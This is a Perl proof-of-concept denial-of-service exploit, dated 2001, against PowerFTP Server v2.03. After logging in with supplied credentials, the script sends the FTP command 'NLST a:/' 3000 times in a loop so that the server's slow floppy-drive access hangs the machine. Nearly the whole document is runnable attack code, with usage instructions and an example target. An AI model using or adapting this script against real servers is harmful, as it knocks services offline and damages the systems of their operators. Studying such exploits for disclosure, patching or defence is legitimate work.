#!/usr/bin/perl
#
# Even though the server will deny access, the slow hardware 
# will still hang the machine. This program attempts to 
# exploit this weakness by sending the 'NLST a:/' command to 
# the server 
#
# PowerFTP Server v2.03 proof-of-concept exploit
# By Alex Hernandez <al3x.hernandez@ureach.com> (C)2001.
#
# Thanks all the people from Spain and Argentina.
# Special Greets: White-B, Pablo S0r, Paco Spain, L.Martins,
# G.Maggiotti & H.Oliveira.
# 
#
# Usage: perl -x PowerFTP_floppy.pl <server> <port> <user> <pass>
#
# Example: 
#
# perl -x PowerFTP_floppy.pl 10.0.0.1 21 temp temp
# 

use IO::Socket;

print("\nPowerFTP server v2.03 DoS exploit Floppy (c)2001\n");
print("Alex Hernandez al3xhernandez\@ureach.com\n\n");

#$NUMBER_TO_SEND = 3000; 
$BUFF = 3000; 

if ( scalar @ARGV < 4 ) {
    print "Usage: $0 <server> <port> <user> <pass>\n";
    exit();
}


$target = $ARGV[ 0 ];
$port = $ARGV[ 1 ];
$username = $ARGV[ 2 ];
$password = $ARGV[ 3 ];

print "Creating socket... ";
$sock = new IO::Socket::INET( PeerAddr => $target,
                              PeerPort => int( $port ), 
                                Proto => 'tcp' );
die "$!" unless $sock;
print "done.\n";


read( $sock, $buffer, 1 );


print "Sending username...";
print $sock "USER " . $username . "\n";
read( $sock, $buffer, 1 );
print "done.\n";


print "Sending password...";
print $sock "PASS " . $password . "\n";
read( $sock, $buffer, 1 );
print "done.\n";


print "DoS Attack floppy server...";
for( $i = 0; $i < $BUFF; $i++ ) {

    print $sock "NLST a:/\n";   
    read( $sock, $buffer, 1 );
}

print "done.\n";

close( $sock );
exit();
